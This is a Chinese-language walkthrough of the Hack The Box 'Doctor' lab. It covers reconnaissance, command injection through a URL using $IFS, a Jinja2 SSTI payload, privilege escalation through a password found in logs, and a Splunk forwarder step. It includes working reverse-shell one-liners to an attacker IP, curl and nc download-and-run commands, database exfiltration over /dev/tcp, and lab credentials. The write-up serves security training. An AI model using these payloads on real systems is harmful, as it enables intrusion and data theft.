# 零.剧情简介

```c
Doctor是一个简单的机器，其特点是在端口80上运行着一个Apache服务器。
    用户可以在主网页上识别到一个虚拟主机，并在将其添加到其hosts文件后，
    获取对Doctor Messaging System的访问权限。发现该系统易受服务器端模板注入的攻击，
    并成功利用该漏洞将导致用户web获得一个shell。
    这个用户属于adm组，并能够读取各种系统日志。
    枚举日志后发现一个放错位置的密码，可用于登录为用户shaun。
    对系统服务的枚举显示，一个Splunk Universal Forwarder正在端口8089上以root的身份运行。
    研究发现了一个可用于具有有效凭据的漏洞利用，以远程执行代码并提升我们的权限。
```



## 1.技能要求

```c
枚举
```

## 2.技能

```c
识别服务器端模板注入
利用SSTI获取远程代码执行
密码日志枚举
利用Splunk通用转发器漏洞 Exploiting the Splunk Universal Forwarder
```

## 3.目录

```C
00:00 - 简介
00:57 - 开始使用Nmap进行扫描
01:40 - 探索网站并在后台运行Gobuster/SQLMap
07:50 - 注册账户并枚举新功能，寻找 XSS 漏洞
08:30 - 测试是否可以点击链接，发现 Curl 可以连接回我们的机器
11:20 - 在 URL 中找到命令注入漏洞，找到一种执行带空格命令的方法
13:37 - 扩展花括号不起作用，但 IFS 允许我们绕过空格作为不良字符
15:30 - 尝试获取反向 shell，但由于不良字符而失败
18:47 - 使用 Curl 下载一个反向 shell 脚本，然后执行它以避免不良字符
22:00 - 将 site.db 传输到我们的机器上，以便我们可以查看内容并尝试破解管理员密码
29:40 - 发现我们是ADM组的一部分，并且可以读取日志！日志中包含一个密码
33:50 - 检查 Splunk 版本并寻找漏洞
34:55 - 在 SearchSploit 中没有看到任何内容，搜索漏洞后获取 root 权限
38:22 - 非预期：探索 SSTI 漏洞
39:45 - 使用基本的 SSTI 来确定网站使用的框架
42:20 - 创建一个 SSTI Jinja2 反向 shell 负载并获得 shell
45:00 - 探索 CURL 漏洞
47:00 - 对 SSTI 漏洞进行深入研究并修补
```







# 一.nmap

## 1.扫描方式

### (1.复杂扫描

```c
ports=$(nmap -p- --min-rate=1000 -T4 10.129.191.66 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.191.66 -Pn
```

### (2.效率扫描

```c
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.2.21//要有nmap文件夹
nmap -sT -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.129.2.21//要有scans文件夹
less nmap/nmap-tcpscripts
```

![Screenshot_20240416_161833](./图/Screenshot_20240416_161833.png)

![Screenshot_20240416_161856](./图/Screenshot_20240416_161856.png)

### (3.普通扫描

```c
nmap -v -sC -sV nmap 10.129.2.21
```

## 2.端口总结

```c
这个Nmap扫描结果显示了目标主机的一些关键信息：

- IP地址：10.129.2.21
- 22端口：开放，运行SSH服务（OpenSSH 8.2p1 Ubuntu 4ubuntu0.1），提供RSA、ECDSA和ED25519类型的SSH主机密钥。
- 80端口：开放，运行HTTP服务（Apache httpd 2.4.41），服务器标头显示为Ubuntu系统，并且网页标题为"Doctor"。

这些信息可用于进一步的渗透测试或者攻击表面分析。
```







# 二.80端口渗透测试

```c
官方笔记说有8089,我换了好几个靶场都没有
    总之我知道你很急,但是你先别急了 先访问80端口
```

![Screenshot_20240416_164131](./图/Screenshot_20240416_164131.png)

## 1.抓包判断服务器

```C
burp的发现
http://10.129.191.66/
HTTP 标头显示它正在 Apache 上运行：
```

![Screenshot_20240416_164428](./图/Screenshot_20240416_164428.png)



## 2.目录爆破

```c
gobuster dir -u http://10.129.191.66 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster.out
```

![Screenshot_20240416_172451](./图/Screenshot_20240416_172451.png)

### (1.寻找网站加载文件

```c
F12,一键查看
```

![Screenshot_20240416_173226](./图/Screenshot_20240416_173226.png)

![Screenshot_20240416_173335](./图/Screenshot_20240416_173335.png)



## 3.host添加

```c
info@doctors.htb
```

![Screenshot_20240416_165105](./图/Screenshot_20240416_165105.png)

```c
"vi /etc/hosts"
"10.129.191.66 doctors.htb"
```

或者

```c
echo "10.129.191.66 doctors.htb" | sudo tee -a /etc/hosts
```

![Screenshot_20240408_181051](/home/brandonsavastano/HTB幕府/2.道场/古武流_OSCP/Linux/33.Tabby/图/Screenshot_20240408_181051.png)

## 4.doctors.htb

```c
http://doctors.htb
访问该网址,把我们带到了一个后台上面
http://doctors.htb/login?next=%2F：
```

![Screenshot_20240416_170023](./图/Screenshot_20240416_170023.png)

### (1.判断该网站是否前后端分离

```c
用burp抓包,我操了,看不到
```

![Screenshot_20240416_170438](./图/Screenshot_20240416_170438.png)

### (2.sql注入

#### 1).如何去掉加密

```c
把type的password删除
a' or 1=1-- -
```

![Screenshot_20240416_174244](./图/Screenshot_20240416_174244.png)

![Screenshot_20240416_174612](./图/Screenshot_20240416_174612.png)

#### 2).手动注入测试

```c
多次发包之后,发现
```

![Screenshot_20240416_181051](./图/Screenshot_20240416_181051.png)

![Screenshot_20240416_181115](./图/Screenshot_20240416_181115.png)

#### 3).自动sqlmap

```C
保存数据包为login.req
    然后 "sqlmap -r login.req --batch"
    一眼看出失败了
```

![Screenshot_20240416_193247](./图/Screenshot_20240416_193247.png)

### (3.逻辑页面测试

```c
现在我们不得不尝试从忘记密码中寻找可能的用户
```

![Screenshot_20240416_194208](./图/Screenshot_20240416_194208.png)

```C
然后随便输入一个,咱们就发现了,这个用户名没注册
```

![Screenshot_20240416_210213](./图/Screenshot_20240416_210213.png)



```c
admin@qq.com' or 1=1-- -
    
//ok 多了一个无效的电子邮件地址的提示,说明有这个注入点
```

![Screenshot_20240416_210958](./图/Screenshot_20240416_210958.png)



#### 1).注册

```c
注册成功之后还有20分钟的时间限制,我真的是服了
```

![Screenshot_20240416_212826](./图/Screenshot_20240416_212826.png)

![Screenshot_20240416_212931](./图/Screenshot_20240416_212931.png)

```c
然后赶紧登录
```

![Screenshot_20240416_213034](./图/Screenshot_20240416_213034.png)

![Screenshot_20240416_213101](./图/Screenshot_20240416_213101.png)

```c
然后点击数字1发现我们跳转到了page=1
```

![Screenshot_20240416_213851](./图/Screenshot_20240416_213851.png)

#### 2).接口XSS测试

##### (1).xss_1失败

```c
就是通过留言功能,查看用户名是否变粗
    如果用户名变粗就说明存在跨站脚本的存在
```

![Screenshot_20240416_214509](./图/Screenshot_20240416_214509.png)

![Screenshot_20240416_214806](./图/Screenshot_20240416_214806.png)

![Screenshot_20240416_214821](./图/Screenshot_20240416_214821.png)

![Screenshot_20240416_214914](./图/Screenshot_20240416_214914.png)

![Screenshot_20240416_215653](./图/Screenshot_20240416_215653.png)

##### (2).xss_2成功

```c
行吧这个没变,下一个xss测试
    进攻方:nc -lvnp 8888
    测试界面:http://10.10.14.64:8888
```

![Screenshot_20240416_221255](./图/Screenshot_20240416_221255.png)

###### CURL

```c
Curl是一个用于传输数据的命令行工具和库。
    它支持多种协议，包括HTTP、HTTPS、FTP、FTPS、SCP、SFTP、TFTP、LDAP、和许多其他协议。
    Curl最初由Daniel Stenberg创建，现在由一个全球社区维护。

Curl的主要功能包括：
    1. 下载和上传文件：Curl可以从网址下载文件，也可以上传文件到服务器。
    2. HTTP请求：Curl可以模拟HTTP请求，包括GET、POST、PUT、DELETE等方法。
    3. 支持代理：Curl支持使用代理服务器进行连接。
    4. 断点续传：Curl可以在下载中断后恢复下载，支持断点续传功能。
    5. 支持多种协议：除了HTTP和HTTPS，Curl还支持FTP、SFTP、SCP等多种协议。
总的来说，Curl是一个非常强大且灵活的工具，用于从命令行发送和接收数据。
```

##### (3).测试文件传输

```c
"echo PleaseSubscribe > test"

"python3 -m http.server 7777"
"http://10.10.14.64:7777/test -o /var/www/html/test"
```

![Screenshot_20240416_224603](./图/Screenshot_20240416_224603.png)

![Screenshot_20240416_224834](./图/Screenshot_20240416_224834.png)

###### _验证失败

```c
http://10.10.14.64:7777/var/www/html/test
```

![Screenshot_20240416_225459](./图/Screenshot_20240416_225459.png)

##### (4).xss文件传输_失败

```c
让我们看看新的消息，让我们将这些放在引号中，我之所以尝试这种类型的命令注入，是因为用户代理是 curl
    如果用户代理是像 Python 请求那样的，我可能不会做什么，但因为用户代理是一个 Linux 程序
    我知道他们正在调用 bash 来执行这个，所以让我们看看，我的想法是...
```

```c
"http://10.10.14.64:7777/test" "-o" "/var/www/html/test"
```

![Screenshot_20240416_230239](./图/Screenshot_20240416_230239.png)

![Screenshot_20240416_225459](./图/Screenshot_20240416_225459.png)

##### (5).xss命令执行

```c
http://10.10.14.64:7777/$(whoami)
```

```c
/*****************************************************************************
所以我要发布这条消息，然后我们回到这里，我们得到了网页，因为它说的是网页而不是像命令注入那样的
我知道我们刚刚执行了代码，所以现在我们可以玩一下了，现在最简单的事情可能是去用 Burp Suite 拦截它
然后在这个 Repeater 标签中玩，我按下了 Windows 键和 L 键来发送它
*********************************************************************************/
```

![Screenshot_20240416_230239](./图/Screenshot_20240416_230239.png)

#### 3).getshell

```c
http://10.10.14.64:7777/$(echo+test)
http://10.10.14.64:7777/$(echo,test)

没有一丝丝反应,还是老旧的反应
```

![Screenshot_20240417_000556](./图/Screenshot_20240417_000556.png)

##### (1).命令注入原理

```c
http://10.10.14.64:7777/$(echo,test)
```

![Screenshot_20240417_001124](./图/Screenshot_20240417_001124.png)

![Screenshot_20240417_001424](./图/Screenshot_20240417_001424.png)

###### _攻击

```c
http://10.10.14.64:7777/$(echo$IFS'test')
是有反应的
我尝试使用$IFS来表示空间（一种常见的注入技术）
```

![Screenshot_20240417_175745](./图/Screenshot_20240417_175745.png)



```c
接下来让我们尝试getshell一下子
    
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.22/9001 0>&1'" | base64 -w 0|base64 -w 0
```

![Screenshot_20240417_165135](./图/Screenshot_20240417_165135.png)

```c
http://10.10.14.22:7777/$(echo$IFS'WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eU1pODVNREF4SURBK0pqRW4='|'bash'$IFS'-d'|'bash')
```

![Screenshot_20240417_181029](./图/Screenshot_20240417_181029.png)





```c
http://10.10.14.22:7777/$(which$IFS'curl')
```

![Screenshot_20240417_181150](./图/Screenshot_20240417_181150.png)

```c
http://10.10.14.22:7777/$(curl$IFS'-o'$IFS'/var/www/html/test'$IFS'http://10.10.14.22:7777/test')
```

![Screenshot_20240417_181701](./图/Screenshot_20240417_181701.png)





上传绕过成功

```c
vi test
    
bash -c 'bash -i &> /dev/tcp/10.10.14.22/9001 0>&1'
    
http://10.10.14.22:7777/$(curl$IFS'-o'$IFS'/var/www/html/test'$IFS'http://10.10.14.22:7777/test')
```

![Screenshot_20240417_182557](./图/Screenshot_20240417_182557.png)

![Screenshot_20240417_182751](./图/Screenshot_20240417_182751.png)



```c
http://10.10.14.22:7777/$(bash$IFS'/var/www/html/test')
```

![Screenshot_20240417_183003](./图/Screenshot_20240417_183003.png)



###### _ssh

```c
//进攻方     
"tcpdump -ni tun0 icmp"
```

```c
//被害方
http://10.10.14.6/$(ping$IFS-c$IFS'1'$IFS'10.10.14.6')
```

```c
我们需要创建ssh目录,并且写入被害机

http://10.10.14.6/$(mkdir$IFS'/home/web/.ssh')

http://10.10.14.6/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d'>'/home/web/.ssh/authorized_keys')
```

```c
//进攻方
"ssh -i ~/keys/ed25519_gen web@10.129.2.21"
```





##### (2).SSTI注入原理

```C
Python Web 服务器可能容易受到服务器端模板注入的攻击。
    如果用户输入未经净化，则可以将其包含在模板代码中而不是作为文本处理
    这可以允许远程代码执行。 
    OWASP 有一个页面详细介绍了背景。
    一个简单的例子是基于 Python Jinja2 的服务器，其路由如下：
    
```

```bash
@app.route("/hello")
def hello():
    user = request.values.get("user")
    return Jinja2.from_string(f'Hello {user}!').render()
```

```c
/*********************************************************************************
这段代码是一个简单的Flask应用程序的一部分，它创建了一个路由 `/hello`
    当访问该路由时，会执行 `hello()` 函数。

    
在 `hello()` 函数中：

    - `request.values.get("user")` 从请求中获取名为 "user" 的参数的值。
        这意味着如果你访问 `/hello?user=John`，则 `user` 将会被赋值为 "John"。
        如果没有提供 "user" 参数，那么 `user` 的值将会是 `None`。

    - `Jinja2.from_string(f'Hello {user}!').render()` 使用Jinja2模板引擎
        将字符串 `f'Hello {user}!'` 渲染为一个包含用户提供的名字的问候语的HTML页面。
        如果没有提供 "user" 参数，那么问候语将不包含用户名，而是仅仅是 "Hello !"。

总的来说，这个路由函数的作用是返回一个包含用户提供的名字的问候语的HTML页面。
*********************************************************************************/
```

```c
如果用户提交像这样的 get 请求/hello?user={{7*7}}，结果会是Hello 49!
因为该render函数将处理大括号内的文本。
```

```C
PayloadsAllTheThings 在SSTI 页面上有一张很棒的图片，展示了如何测试 SSTI：
```

![Screenshot_20240417_004546](./图/Screenshot_20240417_004546.png)

###### _攻击

```c
${7*7},我操没看到,真神奇
即使是${{7*7}}
```

```c
nc -lnvp 9001
```

![Screenshot_20240417_211429](./图/Screenshot_20240417_211429.png)



```c
然后在导航栏里面,翻开源代码,我们发现了一个注释是archive
```

![Screenshot_20240417_212852](./图/Screenshot_20240417_212852.png)

![Screenshot_20240417_212831](./图/Screenshot_20240417_212831.png)

```
然后直接访问http://doctors.htb/archive
发现什么也没有,一定要看源代码,发现${{7*7}}可以造成ssti注入
```

![Screenshot_20240417_212505](./图/Screenshot_20240417_212505.png)

![Screenshot_20240417_212516](./图/Screenshot_20240417_212516.png)

```c
//准备构建ssti注入payload
```

```c
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.22\",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

![Screenshot_20240417_222202](./图/Screenshot_20240417_222202.png)

```c
然后再次访问
http://doctors.htb/archive
```

![Screenshot_20240417_222256](./图/Screenshot_20240417_222256.png)



# 三.提权

## 1.web-->shaun

### (1.必要的措施

#### 1).持久连接

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

#### 2).全局变量

```c
export TERM=xterm
```

![Screenshot_20240417_225250](./图/Screenshot_20240417_225250.png)

### (2.翻箱倒柜

```c
cd blog
ls
cd flaskblog/
ls
```



#### 1).分析数据库文件

##### (1).传输数据

```C
进攻方 "nc -lvnp 9001 > site.db"
被害方 "cat site.db > /dev/tcp/10.10.14.22/9001"
```

![Screenshot_20240417_231633](./图/Screenshot_20240417_231633.png)

##### (2).分析代码

```C
"sqlite3 site.db .dump"
```

![Screenshot_20240417_231802](./图/Screenshot_20240417_231802.png)

```sqlite
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(20) NOT NULL, 
	email VARCHAR(120) NOT NULL, 
	image_file VARCHAR(20) NOT NULL, 
	password VARCHAR(60) NOT NULL, 
	PRIMARY KEY (id), 
	UNIQUE (username), 
	UNIQUE (email)
);
INSERT INTO user VALUES(1,'admin','admin@doctor.htb','default.gif','$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S');
CREATE TABLE post (
	id INTEGER NOT NULL, 
	title VARCHAR(100) NOT NULL, 
	date_posted DATETIME NOT NULL, 
	content TEXT NOT NULL, 
	user_id INTEGER NOT NULL, 
	PRIMARY KEY (id), 
	FOREIGN KEY(user_id) REFERENCES user (id)
);
INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog to share medical knowledge. Be kind!',1);
COMMIT;
```

```C
从提供的 SQLite 数据库导出中可以提取到以下有用信息：

1. 数据库包含两个表格：
   - 用户表（user）：包含字段 id、username、email、image_file、password。主键是 id，同时 username 和 email 列设置了唯一约束。
   - 帖子表（post）：包含字段 id、title、date_posted、content、user_id。主键是 id，同时 user_id 列设置了外键约束，参考用户表的 id 列。

2. 用户表中有一个名为 admin 的用户，其信息为：
   - 用户名：admin
   - 电子邮件：admin@doctor.htb
   - 图像文件：default.gif
   - 密码：$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S

3. 帖子表中有一篇标题为 "Doctor blog" 的博客，发布日期为 "2020-09-18 20:48:37.55555"，内容为 "A free blog to share medical knowledge. Be kind!"，作者的用户 ID 是 1（即管理员用户）。

这些信息可以用于进一步分析数据库结构和内容，或者进行相关的渗透测试。
```

##### (3).hashcat

###### _判断

```c
vi docator
$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
```

![Screenshot_20240417_233535](./图/Screenshot_20240417_233535.png)

```c
"hashcat --example-hashes|less"
"/bcrypt"
//凭经验判断数据是bcrypt加密
```

![Screenshot_20240417_235730](./图/Screenshot_20240417_235730.png)

![Screenshot_20240417_235754](./图/Screenshot_20240417_235754.png)

###### _破解

````c
"hashcat -m 3200 docator /usr/share/wordlists/rockyou.txt"
但是实在是太慢了
````

![Screenshot_20240418_000626](./图/Screenshot_20240418_000626.png)

#### 2).home

```c
"cd /home/shaun"
"find / -user shaun -ls 2>/dev/null"
/********************************************
这个命令是一个Linux系统下的查找命令，用于查找所有属主为 "shaun" 的文件并输出它们的详细信息。
让我来解释一下：

    - `find`: 这是Linux系统下的一个常用命令，用于查找文件和目录。
    - `/`: 这是查找的起始路径，表示从根目录开始进行查找。
    - `-user shaun`: 这是 `find` 命令的一个选项，用于指定查找文件的属主为 "shaun" 的文件。
    - `-ls`: 这是 `find` 命令的一个选项，表示以详细的格式列出文件信息。
    - `2>/dev/null`: 这是将标准错误输出（stderr）重定向到 /dev/null
                     目的是隐藏查找过程中的权限错误或者无法访问的目录的提示信息。

因此，这个命令的意思是在整个文件系统中查找所有属主为 "shaun" 的文件，并以详细的格式列出它们的信息。
***********************************************/
```

![Screenshot_20240418_005536](./图/Screenshot_20240418_005536.png)

![Screenshot_20240418_005604](./图/Screenshot_20240418_005604.png)

![Screenshot_20240418_010224](./图/Screenshot_20240418_010224.png)



#### 3).日志审计

```c
"cd /var/log"
"grep -r passw . 2>/dev/null"
/****************************************
这个命令使用 `grep` 工具在当前目录（`.`）及其所有子目录中递归搜索包含字符串 "passw" 的文件内容，
并将匹配的行显示出来。
让我来解释一下：

    - `grep`:  这是一个用于在文件中搜索指定模式的命令。
    - `-r`:    这是 `grep` 命令的选项之一，表示递归地在指定目录下搜索文件内容。
    - `passw`: 这是要搜索的模式或者字符串。在这个命令中，它是要搜索的目标字符串。
    - `.`:     这是要搜索的起始目录。`.` 表示当前目录。

    - `2>/dev/null`: 这部分是将标准错误输出（stderr）重定向到 `/dev/null`
                     目的是隐藏由于权限问题或者无法访问的目录导致的错误信息。

综合起来，这个命令的作用是在当前目录及其子目录中递归搜索包含字符串 "passw" 的文件内容，并将匹配的行显示出来。
************************************************************/
```

```c
“Guitar123”看起来不像电子邮件地址。它看起来像一个密码。
```

![Screenshot_20240418_010743](./图/Screenshot_20240418_010743.png)





### (4.坏豆子上传

#### 1).传统上传方法

```C
SO,关于提权 老一套 进攻方机开启80端口，受害机进行下载运行坏豆子 
    攻击机:'python3 -m http.server 8888'
    受害机:'curl -L http://10.10.14.22:8888/linpeas.sh | bash'
https://github.com/carlospolop/PEASS-ng
https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

![Screenshot_20240418_003243](./图/Screenshot_20240418_003243.png)



#### 2).奇葩上传方法

```c
被害方:"nc 10.10.14.13 8888 | bash"
进攻方:"nc -lvnp 8888 < linpeas.sh"
```

#### 3).wget上传方法

```c
攻击机:'python3 -m http.server 8888'
进攻方:"wget -O - 10.10.14.13:8888/linpeas.sh | bash"
```





### (5.分析坏豆子

```c
当然，这里是提供的信息摘要：

1. 基本信息：
   - 操作系统：Ubuntu 20.04 LTS
   - 用户和组：用户 `web`，UID 1001，GID 1001，属于组 `web` 和 `adm`。
   - 主机名：`doctor`

2. 可写入文件夹： 
   - `/dev/shm`

3. 可用的网络工具：
   - `/usr/bin/ping`
   - `/usr/bin/bash`
   - `/usr/bin/nc`

4. 系统信息：
   - Sudo 版本：1.8.31
   - 路径：`/usr/bin:/bin`
   - 日期和正常运行时间：提供了当前日期和正常运行时间信息。
   - 磁盘：`/dev/sda`、`/dev/sda1`、`/dev/sda2`、`/dev/sda5`
   - 未安装的文件系统：在 `/etc/fstab` 中找到的挂载条目。
   - 环境变量：包括敏感信息，如数据库 URI 和秘密密钥。
   - 在 dmesg 中的签名验证失败：未找到。
   - Linux 漏洞建议器的发现：提供了各种 CVE 的详细信息、曝光情况和下载 URL。
   - 保护措施：ASLR 已启用。AppArmor 已启用，但无权读取配置文件集。

5. 容器和云信息：没有运行在容器或云环境中的迹象。


6. 进程列表：
   - 有一些被列为非期望的进程，可能是异常或潜在的安全风险。
       例如，`bpfilter_umh`、`VGAuthService`、`vmtoolsd`等。
   - 还有一些通过`web`用户运行的进程，包括一个Python脚本和一些bash会话，这可能是一个值得关注的用户。

7. 进程权限和父进程：有一些进程的权限或父进程属于不同的用户，这可能会导致特权升级的风险。
                  例如，`cron`和`apache2`等。

8. 计划任务：`cron`和`anacron`等计划任务的配置被列出。检查这些任务是否被滥用或者是否存在安全漏洞。

9. 系统定时器：列出了一系列系统定时器及其下一次运行的时间。这些定时器包括系统维护任务和更新检查。

10. 服务和脚本：列出了一些系统服务和脚本的信息，包括它们的路径和权限。


11. 分析.timer文件：这部分似乎包含了与Linux系统计时器相关的文件信息。
                   systemd中的计时器用于调度任务。
                   提供的链接可能包含了攻击者如何利用计时器文件中的漏洞进行权限提升的细节。

12. 分析.socket文件：这部分讨论了套接字文件的分析，套接字是进程用来发送和接收数据的通信端点。
                   提供的信息包括可写监听器及其关联文件的详细信息，可能突出了潜在的弱点。

13. Unix套接字监听：这里列出了系统上正在监听的Unix套接字列表，以及它们的权限。
                  这些信息有助于了解正在运行的服务，以及可能的弱点。

14. D-Bus配置文件：D-Bus是Linux系统上用于进程间通信的消息总线系统。
                 这部分列出了在D-Bus配置文件中发现的可能的弱用户策略，指出了可能的权限提升途径。

15. D-Bus服务对象列表：这部分提供了D-Bus服务对象的列表，以及它们对应的进程ID、用户和连接。
                     它有助于识别系统上正在运行的活动D-Bus服务，可能会成为攻击目标。

16. 网络信息：这部分包括有关主机名、主机文件、DNS配置和网络设置的详细信息。
            这对于了解网络环境和潜在的攻击向量至关重要。


17.网络接口
    - 有两个接口：ens160 和 lo。
    - ens160 的IPv4地址为 10.129.2.21
               IPv6地址为 fe80::250:56ff:feb0:3c5b 和 dead:beef::250:56ff:feb0:3c5b。
    - lo 的IPv4地址为 127.0.0.1，IPv6地址为 ::1。

18.活动端口
    - 开放的端口包括 8089、22、111、53（仅本地）、631。
    - 8089 端口有一个服务在监听，但未指定具体服务名称。

19.用户信息- 存在名为 "web" 的用户，UID 为 1001，属于 "web" 和 "adm" 组。
20.扫描sudo配置- 没有找到sudo信息。
21.检查sudo令牌- ptrace保护已启用。
22.检查Pkexec策略- 具有sudo组和admin组权限的管理员。
23.超级用户- 只有root用户。
24.具有控制台访问权限的用户- 有root、shaun、splunk、web用户。
25.所有用户和组- 列出了所有用户和他们的UID、GID和所属组。
26.最后登录- 列出了最后几次登录的用户和时间。
27.用户的最后登录时间- 列出了每个用户的最后登录时间。
28.有关su的提示- 提示测试 "su" 作为其他用户登录。
29.软件信息- 列出了一些有用的软件和已安装的编译器。
31.搜索mysql凭据和执行- 找到了可读取的 /etc/mysql/my.cnf 文件。
32.分析Apache-Nginx文件- 列出了Apache和Nginx的配置文件，包括虚拟主机配置。
33.分析Rsync文件- 列出了一个可读取的rsync配置文件。
34.分析Wifi连接文件- 列出了NetworkManager的wifi连接文件。
35.分析Ldap文件- 找到了一个LDAP密码哈希。
36.搜索ssl/ssh文件- 列出了SSH主机密钥。
37.分析PAM认证文件- 列出了PAM认证文件。
38.分析NFS导出文件- 列出了NFS导出的配置文件。
39.分析Cloud Init文件- 列出了cloud-init配置文件。
40.分析密钥环文件- 找到了一些密钥环文件。
41.搜索非常用passwd文件（splunk）- 找到了与splunk相关的passwd文件。
42.分析PGP-GPG文件- 列出了一些GPG密钥和证书文件。
43.分析Postfix文件- 找到了Postfix的bash补全文件。
这些信息提供了系统中一些有趣的文件和目录的详细信息，包括文件权限、特殊权限（如SUID、SGID）、文件拥有者、ACL（访问控制列表）、以及一些潜在的特权升级路径。我将对其中一些内容进行详细解释：

44. SUID 和 SGID 文件：
   - SUID（Set User ID）和 SGID（Set Group ID）是一种权限机制，
     允许用户以文件的所有者或所属组的权限来执行文件。
     这些文件中包含一些潜在的特权升级漏洞，比如 `sudo` 命令的漏洞或者其他系统命令的漏洞。

45. Capabilities：
   - 这些是系统中具有特殊权限的文件列表。
     特权的分配更加细粒度，可以为二进制文件设置只执行部分特权，而不是完全提升到超级用户权限。

46. AppArmor 二进制配置文件：
   - AppArmor 是 Linux 上的一个安全模块，用于控制特定程序的访问权限。
     这些文件提供了关于哪些程序受到保护以及它们的访问权限的信息。

47. 目录权限：- 列出了一些目录的权限信息，这些目录可能包含一些敏感信息或者配置文件，需要额外的权限来访问
48. 可写文件：- 列出了一些可写文件和目录的信息，这些文件可能包含用户数据或者系统配置，具有一定的安全风险。
49. 可写组文件：- 这些是由组用户可以写入的文件，组用户可以访问这些文件并可能对系统造成影响。
50. 其他有趣文件：- 这里还列出了一些其他有趣的文件，可能包含配置信息、日志文件或者其他对系统安全有影响的文件。


51. 日志文件 (log files): 提供了一些日志文件的信息，包括logrotate版本和相关配置信息。
52. /home/web 文件夹下的内容: 包含了web用户的一些文件，例如`.bash_history`, `.bashrc`, `.profile`等
    
53. 其他用户主目录下的文件: 提供了`/home/shaun`用户主目录下的一些文件
                        包括`.bash_logout`, `.profile`, `.selected_editor`等。
    
54. 数据库文件 (.db/.sql/.sqlite): 发现了一些数据库文件，
                                 包括`/home/web/blog/flaskblog/site.db`,
                                    `/home/web/.cache/tracker/meta.db`, 
                                    `/opt/clean/site.db`等。
                                 从中提取出了一些表的结构信息和数据，例如`user`表。
                                        
55. Web文件: 提供了`/var/www/html`目录下的文件信息。
56. 其他隐藏文件: 提供了一些其他隐藏文件的信息。
57. 可读文件: 提供了一些可读文件的信息，包括备份文件等。
58. 日志中的信息: 提供了一些日志中的内容，可能包含有用的信息，例如用户名和密码的验证信息。
```

![Screenshot_20240418_171900](./图/Screenshot_20240418_171900.png)

#### 1).提权

```c
"su - shaun"
"Guitar123"
```







## 2.shaun --> root

```c
稍微提一下权
    'python3 -c "import pty;pty.spawn('/bin/bash')"'
```

![Screenshot_20240418_172934](./图/Screenshot_20240418_172934.png)

### (1.flag.txt

```c
790ea7c6161045d5faeae8ecd73fe7eb
```

![Screenshot_20240418_173438](./图/Screenshot_20240418_173438.png)



### (2.查看日志

```c
"cd /var/log/apache"
    
"find / -user shaun -readable 2>/dev/null"
/******************************************************************************
这条命令的含义是：

    1. `cd /var/log/apache`：切换当前工作目录到 `/var/log/apache`，进入 Apache 的日志文件目录。
    2. `find / -user shaun -readable 2>/dev/null`：
       - `find`：在文件系统中搜索文件和目录。
       - `/`：指定要搜索的根目录为整个文件系统。
       - `-user shaun`：只搜索属主为 `shaun` 的文件。
       - `-readable`：只搜索当前用户有权限读取的文件。
       - `2>/dev/null`：将标准错误重定向到 `/dev/null`，这样任何错误消息都不会显示在终端上。

这条命令的目的是在整个文件系统中搜索属主为 `shaun` 且当前用户有权限读取的文件和目录。
*************************************************************************************/

"find / -user shaun -ls 2>/dev/null"
//这条命令会搜索整个文件系统中属主为 "shaun" 的文件，并以详细格式列出它们的信息。
    
    
"find / -user shaun -ls 2>/dev/null|grep -v 'proc\|run'"  
/******************************************************************************************
    这个命令会在整个文件系统中查找属主为 "shaun" 的文件，并以详细格式列出它们的信息。
    然后，通过 `grep -v 'proc\|run'` 过滤掉包含 "proc" 和 "run" 的行
    即排除了与 `/proc` 和 `/run` 目录相关的输出。

    `grep` 是一个文本搜索工具，它可以根据正则表达式匹配和过滤文本。
    `-v` 选项告诉 `grep` 只输出不匹配模式的行，即只输出不包含 "proc" 和 "run" 的行。

	这样，你就可以得到不包含 "/proc" 和 "/run" 目录的属主为 "shaun" 的文件的详细信息。
******************************************************************************************/
    
    
"find / -user shaun -ls 2>/dev/null|grep -v 'proc\|run\|sys'"  
/***********************************************************************************
这个命令会在整个文件系统中查找属主为 "shaun" 的文件，并以详细格式列出它们的信息。
然后，通过 `grep -v 'proc\|run\|sys'` 过滤掉包含 "proc"、"run" 和 "sys" 的行
即排除了与 `/proc`、`/run` 和 `/sys` 目录相关的输出。

`grep` 是一个文本搜索工具，它可以根据正则表达式匹配和过滤文本。
`-v` 选项告诉 `grep` 只输出不匹配模式的行，即只输出不包含 "proc"、"run" 和 "sys" 的行。

这样，你就可以得到不包含 "/proc"、"/run" 和 "/sys" 目录的属主为 "shaun" 的文件的详细信息。
**************************************************************************************/
```

![Screenshot_20240418_181750](./图/Screenshot_20240418_181750.png)





### (3.云一下

#### 1).原因

```c
教程上面靶机开放了8089端口,但是实际上现在并没有开放,因此要做一个记录
```

```c
输入  shaun/Guitar123
```

![Screenshot_20240418_182142](./图/Screenshot_20240418_182142.png)

```c
登录进去之后,解锁了大部分的文件访问权限
    然后访问8.0.5
```

![Screenshot_20240418_215409](./图/Screenshot_20240418_215409.png)

